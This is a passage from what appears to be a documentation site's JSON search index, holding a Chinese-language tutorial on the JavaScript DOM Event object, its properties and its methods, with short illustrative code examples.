\uff0c\u90a3\u4e48\u5728\u201c\u6355\u83b7\u9636\u6bb5\u201d\u53ef\u4ee5\u76d1\u542c\u5230\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u8fd9\u4e2a\u4e8b\u4ef6\u5728 div \u5143\u7d20\u4e0a\u89e6\u53d1\u3002 1 div . dispatchEvent ( click ); \u90a3\u4e48\uff0c\u4e0d\u7ba1 div \u5143\u7d20\u662f\u5728\u5192\u6ce1\u9636\u6bb5\u76d1\u542c\uff0c\u8fd8\u662f\u5728\u6355\u83b7\u9636\u6bb5\u76d1\u542c\uff0c\u90fd\u4f1a\u89e6\u53d1\u76d1\u542c\u51fd\u6570\u3002\u56e0\u4e3a\u8fd9\u65f6 div \u5143\u7d20\u662f\u4e8b\u4ef6\u7684\u76ee\u6807\uff0c\u4e0d\u5b58\u5728\u662f\u5426\u5192\u6ce1\u7684\u95ee\u9898\uff0c div \u5143\u7d20\u603b\u662f\u4f1a\u63a5\u6536\u5230\u4e8b\u4ef6\uff0c\u56e0\u6b64\u5bfc\u81f4\u76d1\u542c\u51fd\u6570\u751f\u6548\u3002 \u5b9e\u4f8b\u5c5e\u6027 \u00b6 Event.bubbles\uff0cEvent.eventPhase \u00b6 Event.bubbles \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u4e8b\u4ef6\u662f\u5426\u4f1a\u5192\u6ce1\u3002\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u5c5e\u6027\uff0c\u4e00\u822c\u7528\u6765\u4e86\u89e3 Event \u5b9e\u4f8b\u662f\u5426\u53ef\u4ee5\u5192\u6ce1\u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u9664\u975e\u663e\u5f0f\u58f0\u660e\uff0c Event \u6784\u9020\u51fd\u6570\u751f\u6210\u7684\u4e8b\u4ef6\uff0c\u9ed8\u8ba4\u662f\u4e0d\u5192\u6ce1\u7684\u3002 Event.eventPhase \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u5e38\u91cf\uff0c\u8868\u793a\u4e8b\u4ef6\u76ee\u524d\u6240\u5904\u7684\u9636\u6bb5\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 var phase = event . eventPhase ; Event.eventPhase \u7684\u8fd4\u56de\u503c\u6709\u56db\u79cd\u53ef\u80fd\u3002 0\uff0c\u4e8b\u4ef6\u76ee\u524d\u6ca1\u6709\u53d1\u751f\u3002 1\uff0c\u4e8b\u4ef6\u76ee\u524d\u5904\u4e8e\u6355\u83b7\u9636\u6bb5\uff0c\u5373\u5904\u4e8e\u4ece\u7956\u5148\u8282\u70b9\u5411\u76ee\u6807\u8282\u70b9\u7684\u4f20\u64ad\u8fc7\u7a0b\u4e2d\u3002 2\uff0c\u4e8b\u4ef6\u5230\u8fbe\u76ee\u6807\u8282\u70b9\uff0c\u5373 Event.target \u5c5e\u6027\u6307\u5411\u7684\u90a3\u4e2a\u8282\u70b9\u3002 3\uff0c\u4e8b\u4ef6\u5904\u4e8e\u5192\u6ce1\u9636\u6bb5\uff0c\u5373\u5904\u4e8e\u4ece\u76ee\u6807\u8282\u70b9\u5411\u7956\u5148\u8282\u70b9\u7684\u53cd\u5411\u4f20\u64ad\u8fc7\u7a0b\u4e2d\u3002 Event.cancelable\uff0cEvent.cancelBubble\uff0cevent.defaultPrevented \u00b6 Event.cancelable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e8b\u4ef6\u662f\u5426\u53ef\u4ee5\u53d6\u6d88\u3002\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u5c5e\u6027\uff0c\u4e00\u822c\u7528\u6765\u4e86\u89e3 Event \u5b9e\u4f8b\u7684\u7279\u6027\u3002 \u5927\u591a\u6570\u6d4f\u89c8\u5668\u7684\u539f\u751f\u4e8b\u4ef6\u662f\u53ef\u4ee5\u53d6\u6d88\u7684\u3002\u6bd4\u5982\uff0c\u53d6\u6d88 click \u4e8b\u4ef6\uff0c\u70b9\u51fb\u94fe\u63a5\u5c06\u65e0\u6548\u3002\u4f46\u662f\u9664\u975e\u663e\u5f0f\u58f0\u660e\uff0c Event \u6784\u9020\u51fd\u6570\u751f\u6210\u7684\u4e8b\u4ef6\uff0c\u9ed8\u8ba4\u662f\u4e0d\u53ef\u4ee5\u53d6\u6d88\u7684\u3002 1 2 var evt = new Event ( 'foo' ); evt . cancelable // false \u5f53 Event.cancelable \u5c5e\u6027\u4e3a true \u65f6\uff0c\u8c03\u7528 Event.preventDefault() \u5c31\u53ef\u4ee5\u53d6\u6d88\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u963b\u6b62\u6d4f\u89c8\u5668\u5bf9\u8be5\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002 \u5982\u679c\u4e8b\u4ef6\u4e0d\u80fd\u53d6\u6d88\uff0c\u8c03\u7528 Event.preventDefault() \u4f1a\u6ca1\u6709\u4efb\u4f55\u6548\u679c\u3002\u6240\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4e4b\u524d\uff0c\u6700\u597d\u7528 Event.cancelable \u5c5e\u6027\u5224\u65ad\u4e00\u4e0b\u662f\u5426\u53ef\u4ee5\u53d6\u6d88\u3002 1 2 3 4 5 6 7 8 function preventEvent ( event ) { if ( event . cancelable ) { event . preventDefault (); } else { console . warn ( 'This event couldn\\'t be canceled.' ); console . dir ( event ); } } Event.cancelBubble \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u76f8\u5f53\u4e8e\u6267\u884c Event.stopPropagation() \uff0c\u53ef\u4ee5\u963b\u6b62\u4e8b\u4ef6\u7684\u4f20\u64ad\u3002 Event.defaultPrevented \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u4e8b\u4ef6\u662f\u5426\u8c03\u7528\u8fc7 Event.preventDefault \u65b9\u6cd5\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 3 if ( event . defaultPrevented ) { console . log ( '\u8be5\u4e8b\u4ef6\u5df2\u7ecf\u53d6\u6d88\u4e86' ); } Event.currentTarget\uff0cEvent.target \u00b6 \u4e8b\u4ef6\u53d1\u751f\u4ee5\u540e\uff0c\u4f1a\u7ecf\u8fc7\u6355\u83b7\u548c\u5192\u6ce1\u4e24\u4e2a\u9636\u6bb5\uff0c\u4f9d\u6b21\u901a\u8fc7\u591a\u4e2a DOM \u8282\u70b9\u3002\u56e0\u6b64\uff0c\u4efb\u610f\u4e8b\u4ef6\u90fd\u6709\u4e24\u4e2a\u4e0e\u4e8b\u4ef6\u76f8\u5173\u7684\u8282\u70b9\uff0c\u4e00\u4e2a\u662f\u4e8b\u4ef6\u7684\u539f\u59cb\u89e6\u53d1\u8282\u70b9\uff08 Event.target \uff09\uff0c\u53e6\u4e00\u4e2a\u662f\u4e8b\u4ef6\u5f53\u524d\u6b63\u5728\u901a\u8fc7\u7684\u8282\u70b9\uff08 Event.currentTarget \uff09\u3002\u524d\u8005\u901a\u5e38\u662f\u540e\u8005\u7684\u540e\u4ee3\u8282\u70b9\u3002 Event.currentTarget \u5c5e\u6027\u8fd4\u56de\u4e8b\u4ef6\u5f53\u524d\u6240\u5728\u7684\u8282\u70b9\uff0c\u5373\u4e8b\u4ef6\u5f53\u524d\u6b63\u5728\u901a\u8fc7\u7684\u8282\u70b9\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u76d1\u542c\u51fd\u6570\u6240\u5728\u7684\u90a3\u4e2a\u8282\u70b9\u3002\u968f\u7740\u4e8b\u4ef6\u7684\u4f20\u64ad\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\u4f1a\u53d8\u3002 Event.target \u5c5e\u6027\u8fd4\u56de\u539f\u59cb\u89e6\u53d1\u4e8b\u4ef6\u7684\u90a3\u4e2a\u8282\u70b9\uff0c\u5373\u4e8b\u4ef6\u6700\u521d\u53d1\u751f\u7684\u8282\u70b9\u3002\u8fd9\u4e2a\u5c5e\u6027\u4e0d\u4f1a\u968f\u7740\u4e8b\u4ef6\u7684\u4f20\u64ad\u800c\u6539\u53d8\u3002 \u4e8b\u4ef6\u4f20\u64ad\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u8282\u70b9\u7684\u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 Event.target \u4e0e Event.currentTarget \u5c5e\u6027\u7684\u503c\u662f\u4e0d\u4e00\u6837\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // HTML \u4ee3\u7801\u4e3a // <p id=\"para\">Hello <em>World</em></p> function hide ( e ) { // \u4e0d\u7ba1\u70b9\u51fb Hello \u6216 World\uff0c\u603b\u662f\u8fd4\u56de true console . log ( this === e . currentTarget ); // \u70b9\u51fb Hello\uff0c\u8fd4\u56de true // \u70b9\u51fb World\uff0c\u8fd4\u56de false console . log ( this === e . target ); } document . getElementById ( 'para' ). addEventListener ( 'click' , hide , false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <em> \u662f <p> \u7684\u5b50\u8282\u70b9\uff0c\u70b9\u51fb <em> \u6216\u8005\u70b9\u51fb <p> \uff0c\u90fd\u4f1a\u5bfc\u81f4\u76d1\u542c\u51fd\u6570\u6267\u884c\u3002\u8fd9\u65f6\uff0c e.target \u603b\u662f\u6307\u5411\u539f\u59cb\u70b9\u51fb\u4f4d\u7f6e\u7684\u90a3\u4e2a\u8282\u70b9\uff0c\u800c e.currentTarget \u6307\u5411\u4e8b\u4ef6\u4f20\u64ad\u8fc7\u7a0b\u4e2d\u6b63\u5728\u7ecf\u8fc7\u7684\u90a3\u4e2a\u8282\u70b9\u3002\u7531\u4e8e\u76d1\u542c\u51fd\u6570\u53ea\u6709\u4e8b\u4ef6\u7ecf\u8fc7\u65f6\u624d\u4f1a\u89e6\u53d1\uff0c\u6240\u4ee5 e.currentTarget \u603b\u662f\u7b49\u540c\u4e8e\u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 this \u3002 Event.type \u00b6 Event.type \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7c7b\u578b\u3002\u4e8b\u4ef6\u7684\u7c7b\u578b\u662f\u5728\u751f\u6210\u4e8b\u4ef6\u7684\u65f6\u5019\u6307\u5b9a\u7684\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 var evt = new Event ( 'foo' ); evt . type // \"foo\" Event.timeStamp \u00b6 Event.timeStamp \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6beb\u79d2\u65f6\u95f4\u6233\uff0c\u8868\u793a\u4e8b\u4ef6\u53d1\u751f\u7684\u65f6\u95f4\u3002\u5b83\u662f\u76f8\u5bf9\u4e8e\u7f51\u9875\u52a0\u8f7d\u6210\u529f\u5f00\u59cb\u8ba1\u7b97\u7684\u3002 1 2 var evt = new Event ( 'foo' ); evt . timeStamp // 3683.6999999995896 \u5b83\u7684\u8fd4\u56de\u503c\u6709\u53ef\u80fd\u662f\u6574\u6570\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u5c0f\u6570\uff08\u9ad8\u7cbe\u5ea6\u65f6\u95f4\u6233\uff09\uff0c\u53d6\u51b3\u4e8e\u6d4f\u89c8\u5668\u7684\u8bbe\u7f6e\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u8ba1\u7b97\u9f20\u6807\u79fb\u52a8\u901f\u5ea6\u7684\u4f8b\u5b50\uff0c\u663e\u793a\u6bcf\u79d2\u79fb\u52a8\u7684\u50cf\u7d20\u6570\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 var previousX ; var previousY ; var previousT ; window . addEventListener ( 'mousemove' , function ( event ) { if ( previousX !== undefined && previousY !== undefined && previousT !== undefined ) { var deltaX = event . screenX - previousX ; var deltaY = event . screenY - previousY ; var deltaD = Math . sqrt ( Math . pow ( deltaX , 2 ) + Math . pow ( deltaY , 2 )); var deltaT = event . timeStamp - previousT ; console . log ( deltaD / deltaT * 1000 ); } previousX = event . screenX ; previousY = event . screenY ; previousT = event . timeStamp ; }); Event.isTrusted \u00b6 Event.isTrusted \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u4e8b\u4ef6\u662f\u5426\u7531\u771f\u5b9e\u7684\u7528\u6237\u884c\u4e3a\u4ea7\u751f\u3002\u6bd4\u5982\uff0c\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u4f1a\u4ea7\u751f\u4e00\u4e2a click \u4e8b\u4ef6\uff0c\u8be5\u4e8b\u4ef6\u662f\u7528\u6237\u4ea7\u751f\u7684\uff1b Event \u6784\u9020\u51fd\u6570\u751f\u6210\u7684\u4e8b\u4ef6\uff0c\u5219\u662f\u811a\u672c\u4ea7\u751f\u7684\u3002 1 2 var evt = new Event ( 'foo' ); evt . isTrusted // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c evt \u5bf9\u8c61\u662f\u811a\u672c\u4ea7\u751f\u7684\uff0c\u6240\u4ee5 isTrusted \u5c5e\u6027\u8fd4\u56de false \u3002 Event.detail \u00b6 Event.detail \u5c5e\u6027\u53ea\u6709\u6d4f\u89c8\u5668\u7684 UI \uff08\u7528\u6237\u754c\u9762\uff09\u4e8b\u4ef6\u624d\u5177\u6709\u3002\u8be5\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u67d0\u79cd\u4fe1\u606f\u3002\u5177\u4f53\u542b\u4e49\u4e0e\u4e8b\u4ef6\u7c7b\u578b\u76f8\u5173\u3002\u6bd4\u5982\uff0c\u5bf9\u4e8e click \u548c dblclick \u4e8b\u4ef6\uff0c Event.detail \u662f\u9f20\u6807\u6309\u4e0b\u7684\u6b21\u6570\uff08 1 \u8868\u793a\u5355\u51fb\uff0c 2 \u8868\u793a\u53cc\u51fb\uff0c 3 \u8868\u793a\u4e09\u51fb\uff09\uff1b\u5bf9\u4e8e\u9f20\u6807\u6eda\u8f6e\u4e8b\u4ef6\uff0c Event.detail \u662f\u6eda\u8f6e\u6b63\u5411\u6eda\u52a8\u7684\u8ddd\u79bb\uff0c\u8d1f\u503c\u5c31\u662f\u8d1f\u5411\u6eda\u52a8\u7684\u8ddd\u79bb\uff0c\u8fd4\u56de\u503c\u603b\u662f3\u7684\u500d\u6570\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u5982\u4e0b // <p>Hello</p> function giveDetails ( e ) { console . log ( e . detail ); } document . querySelector ( 'p' ). onclick = giveDetails ; \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 Event.preventDefault() \u00b6 Event.preventDefault \u65b9\u6cd5\u53d6\u6d88\u6d4f\u89c8\u5668\u5bf9\u5f53\u524d\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002\u6bd4\u5982\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u4f1a\u8df3\u8f6c\u5230\u53e6\u4e00\u4e2a\u9875\u9762\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4ee5\u540e\uff0c\u5c31\u4e0d\u4f1a\u8df3\u8f6c\u4e86\uff1b\u518d\u6bd4\u5982\uff0c\u6309\u4e00\u4e0b\u7a7a\u683c\u952e\uff0c\u9875\u9762\u5411\u4e0b\u6eda\u52a8\u4e00\u6bb5\u8ddd\u79bb\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4ee5\u540e\u4e5f\u4e0d\u4f1a\u6eda\u52a8\u4e86\u3002\u8be5\u65b9\u6cd5\u751f\u6548\u7684\u524d\u63d0\u662f\uff0c\u4e8b\u4ef6\u5bf9\u8c61\u7684 cancelable \u5c5e\u6027\u4e3a true \uff0c\u5982\u679c\u4e3a false \uff0c\u8c03\u7528\u8be5\u65b9\u6cd5\u6ca1\u6709\u4efb\u4f55\u6548\u679c\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u53ea\u662f\u53d6\u6d88\u4e8b\u4ef6\u5bf9\u5f53\u524d\u5143\u7d20\u7684\u9ed8\u8ba4\u5f71\u54cd\uff0c\u4e0d\u4f1a\u963b\u6b62\u4e8b\u4ef6\u7684\u4f20\u64ad\u3002\u5982\u679c\u8981\u963b\u6b62\u4f20\u64ad\uff0c\u53ef\u4ee5\u4f7f\u7528 stopPropagation() \u6216 stopImmediatePropagation() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 // HTML \u4ee3\u7801\u4e3a // <input type=\"checkbox\" id=\"my-checkbox\" /> var cb = document . getElementById ( 'my-checkbox' ); cb . addEventListener ( 'click' , function ( e ){ e . preventDefault (); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u5355\u51fb\u4f1a\u9009\u4e2d\u5355\u9009\u6846\uff0c\u53d6\u6d88\u8fd9\u4e2a\u884c\u4e3a\uff0c\u5c31\u5bfc\u81f4\u65e0\u6cd5\u9009\u4e2d\u5355\u9009\u6846\u3002 \u5229\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4e3a\u6587\u672c\u8f93\u5165\u6846\u8bbe\u7f6e\u6821\u9a8c\u6761\u4ef6\u3002\u5982\u679c\u7528\u6237\u7684\u8f93\u5165\u4e0d\u7b26\u5408\u6761\u4ef6\uff0c\u5c31\u65e0\u6cd5\u5c06\u5b57\u7b26\u8f93\u5165\u6587\u672c\u6846\u3002 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u4e3a // <input type=\"text\" id=\"my-input\" /> var input = document . getElementById ( 'my-input' ); input . addEventListener ( 'keypress' , checkName , false ); function checkName ( e ) { if ( e . charCode < 97 || e . charCode > 122 ) { e . preventDefault (); } } \u4e0a\u9762\u4ee3\u7801\u4e3a\u6587\u672c\u6846\u7684 keypress \u4e8b\u4ef6\u8bbe\u5b9a\u76d1\u542c\u51fd\u6570\u540e\uff0c\u5c06\u53ea\u80fd\u8f93\u5165\u5c0f\u5199\u5b57\u6bcd\uff0c\u5426\u5219\u8f93\u5165\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\uff08\u5199\u5165\u6587\u672c\u6846\uff09\u5c06\u88ab\u53d6\u6d88\uff0c\u5bfc\u81f4\u4e0d\u80fd\u5411\u6587\u672c\u6846\u8f93\u5165\u5185\u5bb9\u3002 Event.stopPropagation() \u00b6 stopPropagation \u65b9\u6cd5\u963b\u6b62\u4e8b\u4ef6\u5728 DOM \u4e2d\u7ee7\u7eed\u4f20\u64ad\uff0c\u9632\u6b62\u518d\u89e6\u53d1\u5b9a\u4e49\u5728\u522b\u7684\u8282\u70b9\u4e0a\u7684\u76d1\u542c\u51fd\u6570\uff0c\u4f46\u662f\u4e0d\u5305\u62ec\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u5176\u4ed6\u7684\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 function stopEvent ( e ) { e . stopPropagation (); } el . addEventListener ( 'click' , stopEvent , false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c click \u4e8b\u4ef6\u5c06\u4e0d\u4f1a\u8fdb\u4e00\u6b65\u5192\u6ce1\u5230 el \u8282\u70b9\u7684\u7236\u8282\u70b9\u3002 Event.stopImmediatePropagation() \u00b6 Event.stopImmediatePropagation \u65b9\u6cd5\u963b\u6b62\u540c\u4e00\u4e2a\u4e8b\u4ef6\u7684\u5176\u4ed6\u76d1\u542c\u51fd\u6570\u88ab\u8c03\u7528\uff0c\u4e0d\u7ba1\u76d1\u542c\u51fd\u6570\u5b9a\u4e49\u5728\u5f53\u524d\u8282\u70b9\u8fd8\u662f\u5176\u4ed6\u8282\u70b9\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8be5\u65b9\u6cd5\u963b\u6b62\u4e8b\u4ef6\u7684\u4f20\u64ad\uff0c\u6bd4 Event.stopPropagation() \u66f4\u5f7b\u5e95\u3002 \u5982\u679c\u540c\u4e00\u4e2a\u8282\u70b9\u5bf9\u4e8e\u540c\u4e00\u4e2a\u4e8b\u4ef6\u6307\u5b9a\u4e86\u591a\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u4f1a\u6839\u636e\u6dfb\u52a0\u7684\u987a\u5e8f\u4f9d\u6b21\u8c03\u7528\u3002\u53ea\u8981\u5176\u4e2d\u6709\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\u8c03\u7528\u4e86 Event.stopImmediatePropagation \u65b9\u6cd5\uff0c\u5176\u4ed6\u7684\u76d1\u542c\u51fd\u6570\u5c31\u4e0d\u4f1a\u518d\u6267\u884c\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 function l1 ( e ){ e . stopImmediatePropagation (); } function l2 ( e ){ console . log ( 'hello world' ); } el . addEventListener ( 'click' , l1 , false ); el . addEventListener ( 'click' , l2 , false ); \u4e0a\u9762\u4ee3\u7801\u5728 el \u8282\u70b9\u4e0a\uff0c\u4e3a click \u4e8b\u4ef6\u6dfb\u52a0\u4e86\u4e24\u4e2a\u76d1\u542c\u51fd\u6570 l1 \u548c l2 \u3002\u7531\u4e8e l1 \u8c03\u7528\u4e86 event.stopImmediatePropagation \u65b9\u6cd5\uff0c\u6240\u4ee5 l2 \u4e0d\u4f1a\u88ab\u8c03\u7528\u3002 Event.composedPath() \u00b6 Event.composedPath() \u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u4e8b\u4ef6\u7684\u6700\u5e95\u5c42\u8282\u70b9\u548c\u4f9d\u6b21\u5192\u6ce1\u7ecf\u8fc7\u7684\u6240\u6709\u4e0a\u5c42\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 11 // HTML \u4ee3\u7801\u5982\u4e0b // <div> // <p>Hello</p> // </div> var div = document . querySelector ( 'div' ); var p = document . querySelector ( 'p' ); div . addEventListener ( 'click' , function ( e ) { console . log ( e . composedPath ()); }, false ); // [p, div, body, html, document, Window] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c click \u4e8b\u4ef6\u7684\u6700\u5e95\u5c42\u8282\u70b9\u662f p \uff0c\u5411\u4e0a\u4f9d\u6b21\u662f div \u3001 body \u3001 html \u3001 document \u3001 Window \u3002","title":"Event \u5bf9\u8c61"},{"location":"events/event/#event","text":"","title":"Event \u5bf9\u8c61"},{"location":"events/event/#_1","text":"\u4e8b\u4ef6\u53d1\u751f\u4ee5\u540e\uff0c\u4f1a\u4ea7\u751f\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9\u76d1\u542c\u51fd\u6570\u3002\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a Event \u5bf9\u8c61\uff0c\u6240\u6709\u7684\u4e8b\u4ef6\u90fd\u662f\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u6216\u8005\u8bf4\u7ee7\u627f\u4e86 Event.prototype \u5bf9\u8c61\u3002 Event \u5bf9\u8c61\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u6765\u751f\u6210\u65b0\u7684\u5b9e\u4f8b\u3002 1 event = new Event ( type , options ); Event \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570 type \u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u540d\u79f0\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570 options \u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8868\u793a\u4e8b\u4ef6\u5bf9\u8c61\u7684\u914d\u7f6e\u3002\u8be5\u5bf9\u8c61\u4e3b\u8981\u6709\u4e0b\u9762\u4e24\u4e2a\u5c5e\u6027\u3002 bubbles \uff1a\u5e03\u5c14\u503c\uff0c\u53ef\u9009\uff0c\u9ed8\u8ba4\u4e3a false \uff0c\u8868\u793a\u4e8b\u4ef6\u5bf9\u8c61\u662f\u5426\u5192\u6ce1\u3002 cancelable \uff1a\u5e03\u5c14\u503c\uff0c\u53ef\u9009\uff0c\u9ed8\u8ba4\u4e3a false \uff0c\u8868\u793a\u4e8b\u4ef6\u662f\u5426\u53ef\u4ee5\u88ab\u53d6\u6d88\uff0c\u5373\u80fd\u5426\u7528 Event.preventDefault() \u53d6\u6d88\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u4e00\u65e6\u4e8b\u4ef6\u88ab\u53d6\u6d88\uff0c\u5c31\u597d\u50cf\u4ece\u6765\u6ca1\u6709\u53d1\u751f\u8fc7\uff0c\u4e0d\u4f1a\u89e6\u53d1\u6d4f\u89c8\u5668\u5bf9\u8be5\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002 1 2 3 4 5 6 7 8 var ev = new Event ( 'look' , { 'bubbles' : true , 'cancelable' : false } ); document . dispatchEvent ( ev ); \u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e00\u4e2a look \u4e8b\u4ef6\u5b9e\u4f8b\uff0c\u7136\u540e\u4f7f\u7528 dispatchEvent \u65b9\u6cd5\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u4e0d\u662f\u663e\u5f0f\u6307\u5b9a bubbles \u5c5e\u6027\u4e3a true \uff0c\u751f\u6210\u7684\u4e8b\u4ef6\u5c31\u53ea\u80fd\u5728\u201c\u6355\u83b7\u9636\u6bb5\u201d\u89e6\u53d1\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u4e3a // <div><p>Hello</p></div> var div = document . querySelector ( 'div' ); var p = document . querySelector ( 'p' ); function callback ( event ) { var tag = event . currentTarget . tagName ; console . log ( 'Tag: ' + tag ); // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa } div . addEventListener ( 'click' , callback , false ); var click = new Event ( 'click' ); p . dispatchEvent ( click ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5143\u7d20\u53d1\u51fa\u4e00\u4e2a click \u4e8b\u4ef6\uff0c\u8be5\u4e8b\u4ef6\u9ed8\u8ba4\u4e0d\u4f1a\u5192\u6ce1\u3002 div.addEventListener \u65b9\u6cd5\u6307\u5b9a\u5728\u5192\u6ce1\u9636\u6bb5\u76d1\u542c\uff0c\u56e0\u6b64\u76d1\u542c\u51fd\u6570\u4e0d\u4f1a\u89e6\u53d1\u3002\u5982\u679c\u5199\u6210 div.addEventListener('click', callback, true) \uff0c\u90a3\u4e48\u5728\u201c\u6355\u83b7\u9636\u6bb5\u201d\u53ef\u4ee5\u76d1\u542c\u5230\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u8fd9\u4e2a\u4e8b\u4ef6\u5728 div \u5143\u7d20\u4e0a\u89e6\u53d1\u3002 1 div . dispatchEvent ( click ); \u90a3\u4e48\uff0c\u4e0d\u7ba1 div \u5143\u7d20\u662f\u5728\u5192\u6ce1\u9636\u6bb5\u76d1\u542c\uff0c\u8fd8\u662f\u5728\u6355\u83b7\u9636\u6bb5\u76d1\u542c\uff0c\u90fd\u4f1a\u89e6\u53d1\u76d1\u542c\u51fd\u6570\u3002\u56e0\u4e3a\u8fd9\u65f6 div \u5143\u7d20\u662f\u4e8b\u4ef6\u7684\u76ee\u6807\uff0c\u4e0d\u5b58\u5728\u662f\u5426\u5192\u6ce1\u7684\u95ee\u9898\uff0c div \u5143\u7d20\u603b\u662f\u4f1a\u63a5\u6536\u5230\u4e8b\u4ef6\uff0c\u56e0\u6b64\u5bfc\u81f4\u76d1\u542c\u51fd\u6570\u751f\u6548\u3002","title":"\u6982\u8ff0"},{"location":"events/event/#_2","text":"","title":"\u5b9e\u4f8b\u5c5e\u6027"},{"location":"events/event/#eventbubbleseventeventphase","text":"Event.bubbles \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u4e8b\u4ef6\u662f\u5426\u4f1a\u5192\u6ce1\u3002\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u5c5e\u6027\uff0c\u4e00\u822c\u7528\u6765\u4e86\u89e3 Event \u5b9e\u4f8b\u662f\u5426\u53ef\u4ee5\u5192\u6ce1\u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u9664\u975e\u663e\u5f0f\u58f0\u660e\uff0c Event \u6784\u9020\u51fd\u6570\u751f\u6210\u7684\u4e8b\u4ef6\uff0c\u9ed8\u8ba4\u662f\u4e0d\u5192\u6ce1\u7684\u3002 Event.eventPhase 